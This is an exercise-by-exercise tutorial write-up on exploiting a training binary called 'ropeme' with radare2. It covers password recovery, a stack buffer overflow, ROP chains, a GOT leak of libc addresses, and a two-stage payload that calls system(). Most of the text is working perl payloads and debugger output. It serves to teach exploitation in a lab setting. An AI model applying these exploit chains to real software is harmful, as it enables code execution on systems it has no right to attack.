========
Write-up
========

This writeup is made on linux using radare2 tools a lot. You may want to use
another platform or tools but I won't bother supporting them.

Exercise 1
==========

Using `strings ./ropeme` we find a line "admin42". It happens to be the
username.

Exercise 2
==========

You can trace calls to library functions with ltrace. This includes strcmp:

::

    $ ltrace ./ropeme admin42
    __libc_start_main(0x80485e8, 2, 0xff822c54, 0x8048650 <unfinished ...>
    strcmp("admin42", "admin42")                                         = 0
    puts("Enter password:"Enter password:
    )                                              = 16
    fflush(0xf76f3d60)                                                   = 0
    read(0test
    , "test\n", 512)                                               = 5
    strlen("\304\263\303\271\303\260\342\210\222\303\267<>[\303\227")    = 16
    strcmp("test\n",
    "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227") = -1
    puts("Wrong password"Wrong password
    )                                               = 15
    +++ exited (status 1) +++


The password is "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227". To
see it without the octal notation one can use printf:

::

    $ printf "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227"
    ĳùð−÷<>[×


That explains why is didn't show up using "strings"!

Exercise 3
==========

Reading ltrace's output we can see that fgets is used to get user input
reading up to 512 chars from stdin. What happens if we really write 512
chars?

::

    $ perl -e 'print "A"x512' | ./ropeme admin42
      Segmentation fault      (core dumped) | ./ropeme admin42

Oh! This smells like a buffer overflow! To know where exactly we overwrite
the instruction pointer (eip) I'll use a De Bruijn sequence (I could guess
but this is faster). This is done using radare2 tools.

Here ragg2 will generate a 500-bytes long sequence with no repetitions as
hexadecimal values, rax2 will convert it into ascii values, and we put it in
the clipboard using xclip so that we are able to paste it later.

::

    $ ragg2 -P 500 | rax2 -s - | xclip

Radare2 is then used in debug mode with rarun2 to launch the program with an
argument. We could use gdb but... well... radare2 ^^

::

    $ r2 -d rarun2 program=./ropeme arg1=admin42
        ...
    [0x7f2b22a7ed80]> dc
    Debugging pid = 3482, tid = 1 now
    [0xf77a4b50]> dc
    Enter password:
    <paste>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0

Here we have the address at which it tried to return: 0x41694141
Still in radare2 we convert it into an offset to know how much padding we
need:

::

    [0x41416641]> woO 0x41416641
    92

Let's try that!

::

    $ perl -e 'print "A"x92 . "B"x4' | xclip
    $ r2 -q -c "dc;dc" -d rarun2 program=ropeme arg1=admin42
        ...
    Enter password:
    <paste>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x42424242 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0

It works! We have taken eip! We just have to redirect it to section printing
the winning message. Let's disassemble the function checking the password:

::

    $ r2 ropeme
    [0x080483e0]> aa
    [0x080483e0]> is | grep password
    vaddr=0x08048516 paddr=0x00000516 ord=070 fwd=NONE sz=210 bind=GLOBAL type=FUNC name=check_password
    [0x080483e0]> pdf @ sym.check_password
    ╒ (fcn) sym.check_password 210
    │           0x08048516    55             push ebp
    │           0x08048517    89e5           mov ebp, esp
    │           0x08048519    83ec78         sub esp, 0x78
    │           0x0804851c    83ec0c         sub esp, 0xc
    │           0x0804851f    68e7860408     push str.Enter_password:
    │           0x08048524    e877feffff     call sym.imp.puts
    │           0x08048529    83c410         add esp, 0x10
    │           0x0804852c    a1c4990408     mov eax, dword [obj.stdout__GLIBC_2.0]
    │           0x08048531    83ec0c         sub esp, 0xc
    │           0x08048534    50             push eax
    │           0x08048535    e856feffff     call sym.imp.fflush
    │           0x0804853a    83c410         add esp, 0x10
    │           0x0804853d    83ec04         sub esp, 4
    │           0x08048540    6800020000     push 0x200
    │           0x08048545    8d45a8         lea eax, [ebp-local_22]
    │           0x08048548    50             push eax
    │           0x08048549    6a00           push 0
    │           0x0804854b    e830feffff     call sym.imp.read
    │           0x08048550    83c410         add esp, 0x10
    │           0x08048553    85c0           test eax, eax
    │       ┌─< 0x08048555    7517           jne 0x804856e
    │       │   0x08048557    83ec0c         sub esp, 0xc
    │       │   0x0804855a    68f7860408     push str.Unable_to_get_the_password
    │       │   0x0804855f    e83cfeffff     call sym.imp.puts
    │       │   0x08048564    83c410         add esp, 0x10
    │       │   0x08048567    b801000000     mov eax, 1
    │      ┌──< 0x0804856c    eb78           jmp 0x80485e6
    │      │└─> 0x0804856e    c74597c4b3c3.  mov dword [ebp-local_26_1], 0xb9c3b3c4
    │      │    0x08048575    c7459bc3b0e2.  mov dword [ebp - 0x65], 0x88e2b0c3
    │      │    0x0804857c    c7459f92c3b7.  mov dword [ebp - 0x61], 0x3cb7c392
    │      │    0x08048583    c745a33e5bc3.  mov dword [ebp - 0x5d], 0x97c35b3e
    │      │    0x0804858a    c645a700       mov byte [ebp - 0x59], 0
    │      │    0x0804858e    83ec0c         sub esp, 0xc
    │      │    0x08048591    8d4597         lea eax, [ebp-local_26_1]
    │      │    0x08048594    50             push eax
    │      │    0x08048595    e826feffff     call sym.imp.strlen
    │      │    0x0804859a    83c410         add esp, 0x10
    │      │    0x0804859d    c64405a800     mov byte [ebp + eax - 0x58], 0
    │      │    0x080485a2    83ec08         sub esp, 8
    │      │    0x080485a5    6812870408     push str.________________
    │      │    0x080485aa    8d45a8         lea eax, [ebp-local_22]
    │      │    0x080485ad    50             push eax
    │      │    0x080485ae    e8bdfdffff     call sym.imp.strcmp
    │      │    0x080485b3    83c410         add esp, 0x10
    │      │    0x080485b6    85c0           test eax, eax
    │     ┌───< 0x080485b8    7517           jne 0x80485d1
    │     ││    0x080485ba    83ec0c         sub esp, 0xc
    │     ││    0x080485bd    6823870408     push str.Yeah__You_win_
    │     ││    0x080485c2    e8d9fdffff     call sym.imp.puts
    │     ││    0x080485c7    83c410         add esp, 0x10
    │     ││    0x080485ca    b800000000     mov eax, 0
    │    ┌────< 0x080485cf    eb15           jmp 0x80485e6
    │    │└───> 0x080485d1    83ec0c         sub esp, 0xc
    │    │ │    0x080485d4    6832870408     push str.Wrong_password
    │    │ │    0x080485d9    e8c2fdffff     call sym.imp.puts
    │    │ │    0x080485de    83c410         add esp, 0x10
    │    │ │    0x080485e1    b801000000     mov eax, 1
    │    └─└──> 0x080485e6    c9             leave
    ╘           0x080485e7    c3             ret



Ok, so given the disassembly the key section is at 0x080485bd. Let's try that:

::

    $ perl -e 'print "A"x92 . "\xbd\x85\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    Yeah! You win!
    Segmentation fault (core dumped)

Finally!


Exercise 4
==========

When calling another function, the caller (say `main`) pushes the arguments
on the stack (not always, see further) and uses the call opcode that pushes
the current address on the stack for later return and then jumps to the
sub-routine location.

The sub-routine then pushes the ebp address to define its own stack frame,
takes the arguments from the stack to store them in local variables (often
pushing them back or just stocking them in registers), does its thing, then
pops the stack (the ebp address) and returns to the address at the top of the
stack (our previous return address put there by call). The instruction
pointer is incremented and the program continues.

I left away the stack allocation process besides push/pop because it isn't
very relevent here. Also there are other calling conventions besides the
stack. In x86_64, as the registers are bigger and more numerous they are the
primary way to pass arguments.

So the stack look like that before entering puts:

::

    ^ [string address]
    | [return address]

Note that as the stack is decreasing, pushing puts data at the bottom of this
diagram which is the top of the stack (facing downward). Also I represented
it without really using the opcode "call", that's why there is the return
address.

For strcmp it is similar, but note that the arguments are pushed in reverse
order:

::

    ^ [str2   address]
    | [str1   address]
    | [return address]

Exercise 5
==========

To display the password we will hijack a call to puts(). Such a call means
the stack will look somewhat like that before the call:

::

    ^ [password    address]
    | [puts return address]
    | [puts        address]
    | [padding to overflow]

The address of puts is direct:

::

    $ rabin2 -s ropeme | grep puts
    vaddr=0x080483a0 paddr=0x000003a0 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts

So [puts address] is 0x080483a0. In the same way we find the password address:

::

    $ rabin2 -z ropeme
    ...
    vaddr=0x08048712 paddr=0x00000712 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
    ...

By the way note how rabin2 isn't troubled at all by the weird password.

So far our stack is something like: "a0830408XXXXXXXX12870408". Right now the
return address isn't really important, we will return to the end of the
check_password function, just before the return statement, at address
0x080485e1.

::

    # Stack wanted:
    #
    # ^ [password    address] = 0x08048712
    # | [puts return address] = 0x080485e1
    # | [puts        address] = 0x080483a0
    # | [padding to overflow] = "A" x 100

    $ perl -e 'print "A"x100 . "\xa0\x83\x04\x08\x12\x87\x04\x08\xa2\x86\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ĳùð−÷<>[×
    Segmentation fault (core dumped)

Yeah!

Exercise 6
==========

We want to print an arbitrary message. The printing part can be done with
puts() but what about the "getting the message" part? The program provides
read(), and we can make use of it.

The read system call takes as argument a file descriptor, an address to write
to and a length. We will read from stdin (file descriptor 0). Our message
will be a traditional "Hello World!" which is of length 13 with the null
terminator.

So we need to call read, store our string somewhere, and call puts to print
it. The stack will look somewhat like:

::

    ^ [string address]
    | [end    address]
    | [string len    ]
    | [string address]
    | [stdin  fd     ]
    | [puts   address]
    | [read   address]
    | [padding       ]

However, if we do that when returning from write the argument for puts will
be stdin file descriptor! We need to find a way to clean the stack removing
the three arguments of write.

This is done using a gadget, a small but useful sequence of instructions
present at the end of a function. Here we want something to pop three
arguments off the stack. Let's use radare2 to find something like that.

::

    $ r2 ropeme
     -- Do you want to print 333.5K chars? (y/N)
    [0x08048360]> /R pop
    [0x080483e0]> /R pop
        ...

          0x080486a8             5b  pop ebx
          0x080486a9             5e  pop esi
          0x080486aa             5f  pop edi
          0x080486ab             5d  pop ebp
          0x080486ac             c3  ret

        ...

Better than what we needed! We will only use the last three pops. Returning
to 0x080486a9 will clear the stack of its three last elements then return
normally to the next function. I will refer to that address as pppr for
"pop pop pop ret". Our stack now looks like that:

::

    ^ [string address]
    | [end    address] = 0x080485e1
    | [puts   address] = 0x080483a0
    | [string len    ] = 0x0000000e
    | [string address]
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x080486a9
    | [read   address] = 0x08048380
    | [padding       ] = 'A' x 92

The only thing we lack is an address to write to. We need to find a section
in memory which is more than 14 bytes large and has Read-Write permissions.
We can use radare2 for that:

::

    $ rabin2 -S ropeme | grep "perm=..rw"
    idx=17 vaddr=0x0804989c paddr=0x0000089c sz=4 vsz=4 perm=--rw- name=.init_array
    idx=18 vaddr=0x080498a0 paddr=0x000008a0 sz=4 vsz=4 perm=--rw- name=.fini_array
    idx=19 vaddr=0x080498a4 paddr=0x000008a4 sz=4 vsz=4 perm=--rw- name=.jcr
    idx=20 vaddr=0x080498a8 paddr=0x000008a8 sz=232 vsz=232 perm=--rw- name=.dynamic
    idx=21 vaddr=0x08049990 paddr=0x00000990 sz=4 vsz=4 perm=--rw- name=.got
    idx=22 vaddr=0x08049994 paddr=0x00000994 sz=40 vsz=40 perm=--rw- name=.got.plt
    idx=23 vaddr=0x080499bc paddr=0x000009bc sz=8 vsz=8 perm=--rw- name=.data
    idx=24 vaddr=0x080499c4 paddr=0x000009c4 sz=8 vsz=8 perm=--rw- name=.bss
    idx=30 vaddr=0x0804989c paddr=0x0000089c sz=296 vsz=4096 perm=m-rw- name=phdr1
    idx=31 vaddr=0x08048000 paddr=0x00000000 sz=52 vsz=52 perm=m-rw- name=ehdr

Most sections are too small... The .dynamic seems large enough to be
interesting though. We'll use it.

::

    ^ [string address] = 0x08049712
    | [end    address] = 0x080485e1
    | [puts   address] = 0x080483a0
    | [string len    ] = 0x0000000e
    | [string address] = 0x08049712
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x080486a9
    | [read   address] = 0x08048380
    | [padding       ] = 'A' x 92

Let's try that!

::

    $ perl - <<EOF | ./ropeme admin42
    print "A" x 92
    . "\x80\x83\x04\x08"
    . "\xa9\x86\x04\x08"
    . "\x00\x00\x00\x00"
    . "\x12\x97\x04\x08"
    . "\x0e\x00\x00\x00"
    . "\xa0\x83\x04\x08"
    . "\xe1\x85\x04\x08"
    . "\x12\x97\x04\x08"
    EOF
    Enter password:
    [...]
    Wrong password
    Segmentation fault

Hmm... It didn't work... The reason is that the first call to read (to get
the password) reads 512 bytes from the standard input so it goes in the way
of the other call to read. The solution is to completely fill it and put our
input just after:

::

    ^ [padding       ] = 'B' x 388
    | [string address] = 0x08049712
    | [end    address] = 0x080485e1
    | [puts   address] = 0x080483a0
    | [string len    ] = 0x0000000e
    | [string address] = 0x08049712
    | [stdin  fd     ] = 0x00000000
    | [pppr   address] = 0x080486a9
    | [read   address] = 0x08048380
    | [padding       ] = 'A' x 92

    $ perl - <<EOF | ./ropeme admin42
    print "A" x 92
    . "\x80\x83\x04\x08"
    . "\xa9\x86\x04\x08"
    . "\x00\x00\x00\x00"
    . "\x12\x97\x04\x08"
    . "\x0e\x00\x00\x00"
    . "\xa0\x83\x04\x08"
    . "\xe1\x85\x04\x08"
    . "\x12\x97\x04\x08"
    . "B" x 388
    . "Hello World!\x00"
    EOF
    Enter password:
    [...]
    Wrong password
    Hello World!
    Segmentation fault

Working! That way we can chain function calls at will!

Exercise 7
==========

As strcmp comes from the libc it is dynamically loaded. That means that the
address of the real strcmp function isn't know at compile time. The jump is
made from the PLT section into the GOT section. To know at which address we
jump we just have to ask radare2:

::

    $ rabin2 -s ropeme | grep strcmp
    vaddr=0x08048370 paddr=0x00000370 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp

So the strcmp address in the PLT is 0x08048370. Where does it jump after that?

::

    $ r2 -q -d -c 'dc;pd 1 @ 0x08048370' rarun2 program=ropeme arg1=admin42
        ...
    0x08048370    ff25a0990408   jmp qword [rip + 0x80499a0]   ; [0x10091d16:8]=-1

We now know that the jump in the GOT is done at the address 0x80499a0 for
strcmp. At this address will be dynamically decided the address of the strcmp
function in the dynamically loaded libc. We can print it using our puts
payload from exercise 5:

::

    # Stack wanted:
    #
    # ^ [strcmp GOT  address] = 0x080499a0
    # | [puts return address] = 0x080485e1
    # | [puts        address] = 0x080483a0
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    �tc�P�i�
    Segmentation fault (core dumped)

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    �V�P�\�
    Segmentation fault (core dumped)

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    �\�P�b�
    Segmentation fault (core dumped)

The first 4 bytes of the oddly displayed line are our address. As you can see
the address changes from one call to the other. Let's use strace to see it
more clearly:

::

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' |\
      strace -e write ./ropeme admin42
    [ Process PID=7721 runs in 32 bit mode. ]
    write(1, "Enter password:\n", 16Enter password:
    )       = 16
    write(1, "Wrong password\n", 15Wrong password
    )        = 15
    write(1, "\300$^\367PBd\367\n", 9�$^�PBd�
    )      = 9
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x9} ---
    +++ killed by SIGSEGV +++
    Segmentation fault

    $ printf '\300$^\367' | xxd
    0000000: c024 5ef7                                .$^.

So our address is 0xf75e24c0 in that instance.

The reason I used strace is because if we try piping ropeme's output to
another program (xxd for example in order to get directly an hexadecimal
representation) we won't get any output. The reason is that puts() won't
write directly to the pipe, the output is bufferized. This wouldn't be a
problem normally because all output is flushed at process exit, but as we
segfault we don't benefit from it. Strace is able to see the argument when
the call occurs so before buffering, that's why it works here.

There is another solution though: flushing manually the output. To do that we
will use the fflush function. This function will take a pointer to the stdout
file structure that we don't have... Meh, let's just call it in place:

::

    # Stack wanted:
    #
    # ^ [strcmp GOT  address] = 0x080499a0
    # | [flushing    address] = 0x0804852c
    # | [puts        address] = 0x080483a0
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"' |\
      ./ropeme admin42 | xxd
    0000000: 456e 7465 7220 7061 7373 776f 7264 3a0a  Enter password:.
    0000010: 5772 6f6e 6720 7061 7373 776f 7264 0ab0  Wrong password..
    0000020: f465 f750 126c f70a                      .e.P.l..
    Segmentation fault (core dumped)

There we are.

Exercise 8
==========

This address is interesting because the offset between two libc functions
will always be the same so we can compute the offset to between strcmp and
any other function and use it to determine the address of any other function.

We'll start by computing the offset between system and strcmp in the libc.
Here I take advantage of the fact that I know that the libc that is compiled
is the same than the one used by my system, in the real world you may want to
identify the serveur running and download its standard precompiled libc for
example.

::

    $ r2 /lib/libc-2.22.so
    [0x00020730]> is | grep =system
    vaddr=0x0003f890 paddr=0x0003f890 ord=5724 fwd=NONE sz=45 bind=UNKNOWN type=FUNC name=system
    [0x00020730]> is | grep =strcmp
    vaddr=0x0007f650 paddr=0x0007f650 ord=5510 fwd=NONE sz=60 bind=GLOBAL type=LOOS name=strcmp
    [0x00020730]> ? 0x0007f650 - 0x0003f890
    261568 0x3fdc0 0776700 255.4K 3000:0dc0 261568 11000000 261568.0 0.000000f 0.000000

So the offset from strcmp to system is -0x3fdc0.

We just have to use our previous command, output strcmp address and add the
offset. A bit of unix magic will help: here we use xxd to get an hexadecimal
representation, cut to get the right columms and sed to get the right line
and rearrange the fields into a proper hexadecimal representation of the
address. You may have to fiddle a bit with those commands to get them right
as the output can be a bit different from a computer to the other.

::

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"'\
      | ./ropeme admin42 \
      | xxd \
      | cut -d ' ' -f 2,3 \
      | sed -n '3s/\(....\) \(....\)/0x\2\1/p'
    0xf7504070
    Segmentation fault (core dumped)

There it is!

Exercise 9
==========

In the previous exercise we got the address of the system() function.

Of course having it for a paste instance is quite useless, we must now find
a way to use it without quitting the process. There are two strategies:
either we stay within the program and build the address by using ROP gadgets
astuciously, either we consider use the program as a server, have it output
the address, compute the offset outside the process and then have the process
read the new address back.

We will then need to put our string command somewhere and call system() on it.

First let's adapt our previous system-printing command to output the address
with the offset in a usable form:

::

    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"'\
      | ./ropeme admin42 \
      | xxd \
      | cut -d ' ' -f 2,3 \
      | sed -n '3s/\(....\) \(....\)/0x\2\1-0x3fdc0/p' \
      | rax2 -n \
      | sed 's/\(..\)/\\x\1/g ; s/^.*$/"\1"/'
    "\xad\x22\x4c\xf7"
    Segmentation fault (core dumped)

Remember when we flushed the output? It turns out we call read() just after
that in the same conditions as our first call. We can use that! We will
modify our payload from exercise 6 to put our command ("/bin/touch /tmp/ok")
in the .dynamic section then call system() on it. This is what we want to
send:

::

    // End of stage 2 which spawns a shell
    | "/bin/sh\x00" (not on stack but read from stdin)
    ^ [padding           ] = 'C' x 388
    | [string     address] = 0x08049712
    | [end        address] = 0x00000000
    | [system     address] = 0x????????
    | [string     len    ] = 0x00000008
    | [string     address] = 0x08049712
    | [stdin      fd     ] = 0x00000000
    | [pppr       address] = 0x080486a9
    | [read       address] = 0x08048380
    | [padding           ] = 'B' x 92
    // End of stage 1 which prints the dynamic address of strcmp
    ^ [strcmp GOT address] = 0x080499a0
    | [flushing   address] = 0x0804852c
    | [puts       address] = 0x080483a0
    | [padding           ] = 'A' x 92

The problem is, how can we differentiate the two stages? A solution is to use
a fifo to "serverize" our program: we will write into the fifo from different
processes and the fifo will be the only input to ropeme. We will write in the
fifo the stage 1, get the address as output, compute the new address, the new
payload and write that payload in the fifo to send it to ropeme before it
crashes.

Also, note that we can't just dive into a shell as our stdin and stdout are
taken by the fifo. That's why we aren't trying to execute /bin/sh right on.

::

    $ mkfifo fifo
    $ stage1() {
        perl -e 'print "A" x 92
        . "\xa0\x83\x04\x08"
        . "\x2c\x85\x04\x08"
        . "\xa0\x99\x04\x08"'
    }
    $ stage2() {
        read addr
        perl -e 'print "B" x 92
        . "\x80\x83\x04\x08"
        . "\xa9\x86\x04\x08"
        . "\x00\x00\x00\x00"
        . "\x12\x97\x04\x08"
        . "\x14\x00\x00\x00"' \
        -e ". \"$addr\"" -e '
        . "\x00\x00\x00\x00"
        . "\x12\x97\x04\x08"
        . "C" * 388
        . "/bin/touch /tmp/ok\x00"'
    }
    $ decode_address() {
        sed '1,2d' \
        | xxd \
        | cut -d ' ' -f 2,3 \
        | sed -n 's/\(..\)\(..\) \(..\)\(..\)/0x\4\3\2\1-0x3fdc0/p' \
        | rax2 -n \
        | sed 's/\(..\)/\\\\x\1/g ; s/^\(.*\)$/"\1"/'
    }
    $ > fifo & # Keep the fifo open from one write to the other
    $ stage1 > fifo
    $ echo > fifo   # Flush

    # In another terminal
    $ cat fifo | ./ropeme admin42 | decode_address
    "\\xf0\\xc2\\x69\\xf7"

    $ echo "\\xf0\\xc2\\x69\\xf7" | stage2 > fifo
    Segmentation fault (core dumped)   (in the ropeme terminal)

Hmm... It doesn't work. Let's debug using a bit of strace magic:

::

    $ stage1 > fifo
    # Do the ropeme command there
    $ echo > fifo
    $ echo > fifo

    # In another terminal
    $ cat fifo | strace ./ropeme admin42 | decode_address
    [ Process PID=8926 runs in 32 bit mode. ]
    read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\206\1\0004\0\0\0"..., 512) = 512
    read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512) = 104
    read(0, 0x414140e9, 512)                = -1 EFAULT (Bad address)
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x414140d8} ---
    +++ killed by SIGSEGV (core dumped) +++
    "\\xf0\\x22\\x6c\\xf7"
    Segmentation fault (core dumped)

So it seems that after the call to fflush our stack isn't in good enough a
shape to be used by read. It tries to read into the buffer at address
0x414140e9 and then jumps to the address 0x414140d8 or so it seems. Some more
tests show that thoses numbers are constant. The "0x4141" part looks like our
first padding, can we find the offset? Yes using a De Bruijn sequence:

::

    $ { ragg2 -P 92 \
      | rax2 -s - ;
        perl -e 'print "\xa0\x83\x04\x08"
                     . "\x2c\x85\x04\x08"
                     . "\xa0\x99\x04\x08"'
      } > fifo
    $ echo > fifo
    $ echo > fifo

    # In another terminal
    $ cat fifo | strace ./ropeme admin42 | decode_address
    [ Process PID=26649 runs in 32 bit mode. ]
    read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\206\1\0004\0\0\0"..., 512) = 512
    read(0, "AAABAACAADAAEAAFAAGAAHAAIAAJAAKA"..., 512) = 104
    read(0, 0x416540e9, 512)                = -1 EFAULT (Bad address)
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x416540d8} ---
    +++ killed by SIGSEGV (core dumped) +++
    "\\xf0\\x52\\x64\\xf7"
    Segmentation fault (core dumped)

A bit of r2 magic:

::

    $ r2 -c "woO 0x4165" -q --
    90

So the last to bytes of our padding are the beginning of the address... We
do not control the last two bytes of that address but the beginning may be
enough. We must now find a way to regain control over the flow.

Exercise 10
===========

I won't provide a solution for the ropasaurus rex, there are already a number
of great writeup on the internet. My two favourite are:

- https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming

- https://crowell.github.io/blog/2014/11/23/pwning-with-radare2/

But you really should be able to solve it yourself. You can do it!

